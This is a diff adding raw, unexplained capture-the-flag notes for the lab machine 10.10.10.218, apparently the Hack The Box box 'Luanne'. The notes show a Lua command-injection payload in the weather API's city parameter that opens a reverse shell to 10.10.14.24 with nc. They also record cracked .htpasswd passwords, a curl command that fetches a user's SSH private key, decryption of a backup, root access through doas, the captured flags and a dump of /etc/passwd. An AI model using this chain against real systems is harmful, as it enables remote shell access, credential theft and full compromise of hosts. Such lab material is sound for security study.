@@ -1,0 +1,115 @@
+"No city specified. Use 'city=list' to list available cities."
+
+
+
+
+http://10.10.10.218/weather/forecast?city=list
+
+0	"London"
+1	"Manchester"
+2	"Birmingham"
+3	"Leeds"
+4	"Glasgow"
+5	"Southampton"
+6	"Liverpool"
+7	"Newcastle"
+8	"Nottingham"
+9	"Sheffield"
+10	"Bristol"
+11	"Belfast"
+12	"Leicester"
+
+
+
+
+
+');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.24 4321 >/tmp/f")--
+
+%27%29%3Bos.execute%28%22rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.24%204321%20%3E%2Ftmp%2Ff%22%29--
+
+
+http://10.10.10.218/weather/forecast?city=London%27%29%3Bos.execute%28%22rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.24%204321%20%3E%2Ftmp%2Ff%22%29--
+
+
+
+
+
+
+
+.htpasswd
+
+webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
+webapi_user:iamthebest
+
+
+
+nc 127.0.0.1 3000
+
+
+curl --user webapi_user:iamthebest 127.0.0.1:3001/~r.michaels/id_rsa
+
+
+user.txt                 
+ea5f0ce6a917b0be1eabc7f9218febc0
+
+
+
+~/r.michaels/backups/devel_backup-2020-09-16.tar.gz.enc
+
+
+
+netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output=/tmp/lol.tar.gz && cd /tmp && gunzip lol.tar.gz && tar -xf lol.tar && cd devel-2020-09-16/ 
+
+
+
+
+
+www/.htpasswd
+
+webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.
+
+webapi_user:littlebear
+
+
+
+
+https://unix.stackexchange.com/questions/209633/why-cant-i-use-sudo-on-openbsd
+doas su
+
+
+/root/root.txt
+7a9b5c206e8e8ba09bb99bd113675f66
+
+
+
+
+
+/etc/passwd
+root:*:0:0:Charlie &:/root:/bin/sh
+toor:*:0:0:Bourne-again Superuser:/root:/bin/sh
+daemon:*:1:1:The devil himself:/:/sbin/nologin
+operator:*:2:5:System &:/usr/guest/operator:/sbin/nologin
+bin:*:3:7:Binaries Commands and Source:/:/sbin/nologin
+games:*:7:13:& pseudo-user:/usr/games:/sbin/nologin
+postfix:*:12:12:& pseudo-user:/var/spool/postfix:/sbin/nologin
+named:*:14:14:& pseudo-user:/var/chroot/named:/sbin/nologin
+ntpd:*:15:15:& pseudo-user:/var/chroot/ntpd:/sbin/nologin
+sshd:*:16:16:& pseudo-user:/var/chroot/sshd:/sbin/nologin
+_pflogd:*:18:18:& pseudo-user:/var/chroot/pflogd:/sbin/nologin
+_rwhod:*:19:19:& pseudo-user:/var/rwho:/sbin/nologin
+_proxy:*:21:21:Proxy Services:/nonexistent:/sbin/nologin
+_timedc:*:22:22:& pseudo-user:/nonexistent:/sbin/nologin
+_sdpd:*:23:23:& pseudo-user:/nonexistent:/sbin/nologin
+_httpd:*:24:24:& pseudo-user:/var/www:/sbin/nologin
+_mdnsd:*:25:25:& pseudo-user:/nonexistent:/sbin/nologin
+_tests:*:26:26:& pseudo-user:/nonexistent:/sbin/nologin
+_tcpdump:*:27:27:& pseudo-user:/var/chroot/tcpdump:/sbin/nologin
+_tss:*:28:28:& pseudo-user:/var/tpm:/sbin/nologin
+_rtadvd:*:30:30:& pseudo-user:/var/chroot/rtadvd:/sbin/nologin
+_unbound:*:32:32:& pseudo-user:/var/chroot/unbound:/sbin/nologin
+_nsd:*:33:33:& pseudo-user:/var/chroot/nsd:/sbin/nologin
+uucp:*:66:1:UNIX-to-UNIX Copy:/nonexistent:/sbin/nologin
+nobody:*:32767:39:Unprivileged user:/nonexistent:/sbin/nologin
+r.michaels:*:1000:100::/home/r.michaels:/bin/ksh
+nginx:*:1001:1000:NGINX server user:/var/db/nginx:/sbin/nologin
+dbus:*:1002:1001:System message bus:/var/run/dbus:/sbin/nologin
